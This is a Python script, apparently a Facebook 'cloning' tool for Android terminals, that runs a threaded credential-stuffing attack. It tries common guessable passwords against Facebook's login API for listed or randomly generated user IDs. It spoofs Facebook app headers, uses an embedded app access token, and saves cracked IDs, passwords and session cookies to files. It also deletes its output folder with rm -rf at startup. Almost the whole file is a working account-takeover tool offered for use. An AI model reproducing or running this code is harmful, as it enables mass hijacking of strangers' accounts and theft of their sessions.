import os, sys, time, random, string, requests, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- [ REAL STORAGE SYSTEM - NO ERROR ] ---
def real_storage():
    # Forcefully creating directory if not exists
    os.system('rm -rf /sdcard/EXECUTOR_RESULTS')
    os.system('mkdir -p /sdcard/EXECUTOR_RESULTS')
    return "/sdcard/EXECUTOR_RESULTS"

path_save = real_storage()
loop = 0
oks = []
cps = []

# 🎨 THEME (Elite Cyber Red)
R = '\033[1;31m'
G = '\033[1;32m'
W = '\033[1;37m'
Y = '\033[1;33m'
C = '\033[1;36m'

def get_ua_pro():
    # 2025 High-End Samsung & Pixel simulation
    ver = random.choice(['12','13','14','15'])
    model = random.choice(['SM-S928B', 'Pixel-8-Pro', 'V2303', 'CPH2581'])
    fb_ver = f"{random.randint(440, 500)}.0.0.{random.randint(10, 99)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {ver}; {model} Build/UP1A.{random.randint(230000, 239999)}.001) [FBAN/FB4A;FBAV/{fb_ver};FBBV/{random.randint(500000000, 600000000)};FBDM/{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

def banner():
    os.system('clear')
    print(f"""{R}
    ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
    █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
    ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
    ███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
{W}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G}    [+] STORAGE  : {W}{path_save} (SECURE)
{G}    [+] METHOD   : {W}API-Mbasic-PRO (MIX)
{G}    [+] COUNTRY  : {W}GLOBAL (PK-BD-IN-USA)
{W}    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def crack_real_system(uid, name):
    global loop, oks, cps
    sys.stdout.write(f'\r {W}[{R}ULTIMATUM{W}] {loop} | {G}OK:{len(oks)} | {Y}CP:{len(cps)} '); sys.stdout.flush()
    
    first = name.split(' ')[0].lower() if ' ' in name else name.lower()
    # Unlimited Powerful Passwords - Pro Edition
    pws = [uid, uid[6:], first+'123', first+'786', first+'1234', first+'000', 'pakistan', '786786', 'khan123', 'khan786', 'ali123', '000786', '12345678', '55667788', '112233', '998877']
    
    for pw in pws:
        if len(pw) < 6: continue
        session = requests.Session()
        ua = get_ua_pro()
        
        # Real Device Headers
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'WIFI',
            'user-agent': ua,
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger',
            'x-fb-client-ip': 'True',
            'x-fb-request-analytics-tags': 'graph_service',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
        }
        
        data = {
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "email": uid, "password": pw, "sdk_style": "android",
            "generate_session_cookies": "1", "locale": "en_US", "method": "post"
        }
        
        try:
            # Random API Endpoint Rotation
            url = random.choice(["https://b-graph.facebook.com/auth/login", "https://graph.facebook.com/auth/login"])
            res = session.post(url, data=data, headers=headers).json()
            
            if "session_key" in res:
                cookie = ";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                print(f'\r\n{G} [OK-SUCCESS] {uid} | {pw}')
                print(f'{C} [COOKIE] {W}{cookie}')
                oks.append(uid)
                # Hardcoded Save Path
                with open(f"{path_save}/OK.txt", "a") as f:
                    f.write(f"{uid}|{pw}|{cookie}\n")
                break
            elif "checkpoint" in str(res):
                cps.append(uid)
                # CP save takay baad mein check ho sakain
                with open(f"{path_save}/CP.txt", "a") as f:
                    f.write(f"{uid}|{pw}\n")
                break
        except: pass
    loop += 1

def start_system():
    banner()
    print(f" {R}[1] File Cloning (Real API)")
    print(f" {R}[2] USA/Global Rare IDs (2004-2009)")
    print(f" {R}[3] PAK/BD/IN Old IDs (Mixed)")
    opt = input(f"\n {G}[?] System Selection : {W}")
    
    if opt == '1':
        path = input(f" {G}[+] File Path : {W}")
        ids = open(path, 'r').read().splitlines()
        banner(); print(f" {G}[+] TOTAL TARGETS: {len(ids)}")
        with tred(max_workers=30) as engine:
            for user in ids:
                u = user.split('|')[0]
                n = user.split('|')[1] if '|' in user else "User"
                engine.submit(crack_real_system, u, n)
    elif opt == '2':
        # USA Rare Prefixes
        prefix = random.choice(['1000', '500', '100000'])
        limit = int(input(f" {G}[?] Limit : {W}"))
        ids = [prefix + "".join(random.choices(string.digits, k=9)) + "|Global User" for _ in range(limit)]
        banner(); with tred(max_workers=30) as engine:
            for user in ids:
                u, n = user.split('|')
                engine.submit(crack_real_system, u, n)
    elif opt == '3':
        # PAK/BD/IN Mixed Old Prefixes
        prefix = random.choice(['10000', '100000', '100001', '100008'])
        limit = int(input(f" {G}[?] Limit : {W}"))
        ids = [prefix + "".join(random.choices(string.digits, k=10)) + "|Asian User" for _ in range(limit)]
        banner(); with tred(max_workers=30) as engine:
            for user in ids:
                u, n = user.split('|')
                engine.submit(crack_real_system, u, n)

if __name__ == "__main__":
    start_system()
